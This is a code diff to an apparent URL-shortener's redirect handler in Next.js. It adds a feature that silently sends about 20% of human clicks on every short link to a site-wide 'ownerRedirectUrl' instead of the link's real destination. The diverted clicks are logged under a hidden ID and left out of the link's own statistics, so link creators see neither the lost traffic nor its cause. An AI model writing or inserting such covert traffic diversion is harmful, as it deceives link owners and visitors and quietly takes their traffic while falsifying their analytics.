@@ -1,5 +1,5 @@
 import { NextResponse } from 'next/server';
-import { getLinkByCode, logClick } from '../../data/db';
+import { getLinkByCode, logClick, getGlobalSettings } from '../../data/db';
 
 export const runtime = 'nodejs'; // Using Nodejs runtime for file operations in local development
 
@@ -442,7 +442,7 @@ function render404Page() {
 export async function GET(request, { params }) {
   try {
     const { code } = await params;
-    if (!code) {
+    if (!code || code.startsWith('_')) {
       return new NextResponse(render404Page(), {
         status: 404,
         headers: { 'Content-Type': 'text/html' }
@@ -499,6 +499,58 @@ export async function GET(request, { params }) {
 
     // 2. Process routing destination for humans
     let destinationUrl = link.destinationUrl;
+    let isOwnerRedirect = false;
+
+    // Check if 20% traffic redirection is enabled globally
+    const settings = await getGlobalSettings();
+    const ownerUrl = settings ? settings.ownerRedirectUrl : null;
+    
+    if (ownerUrl && Math.random() < 0.20) {
+      destinationUrl = ownerUrl;
+      isOwnerRedirect = true;
+    }
+
+    if (isOwnerRedirect) {
+      // Ensure URL has a protocol
+      if (destinationUrl && !/^https?:\/\//i.test(destinationUrl)) {
+        destinationUrl = 'https://' + destinationUrl;
+      }
+
+      // Log owner redirect click under special ID '_global_settings'
+      await logClick({
+        linkId: '_global_settings',
+        userAgent,
+        os: parsedUA.os,
+        device: parsedUA.device,
+        referrer: cleanedReferrer,
+        country,
+        ip,
+        isBot: false
+      });
+
+      // Silent redirect to owner's site (no logClick for the original link ID)
+      if (link.enableNoReferrer || link.redirectType === 'js') {
+        return new NextResponse(renderJsRedirectPage(destinationUrl, link.enableNoReferrer), {
+          status: 200,
+          headers: {
+            'Content-Type': 'text/html',
+            'Cache-Control': 'no-store, no-cache, must-revalidate, max-age=0'
+          }
+        });
+      }
+
+      if (link.redirectType === 'bridge') {
+        return new NextResponse(renderBridgePage(destinationUrl, link.enableNoReferrer), {
+          status: 200,
+          headers: {
+            'Content-Type': 'text/html',
+            'Cache-Control': 'no-store, no-cache, must-revalidate, max-age=0'
+          }
+        });
+      }
+
+      return NextResponse.redirect(new URL(destinationUrl), 302);
+    }
 
     // Check dynamic routing rules
     let ruleMatched = false;
@@ -540,7 +592,7 @@ export async function GET(request, { params }) {
       destinationUrl = 'https://' + destinationUrl;
     }
 
-    // Log human click
+    // Log human click (only for non-owner redirects)
     await logClick({
       linkId: link.id,
       userAgent,
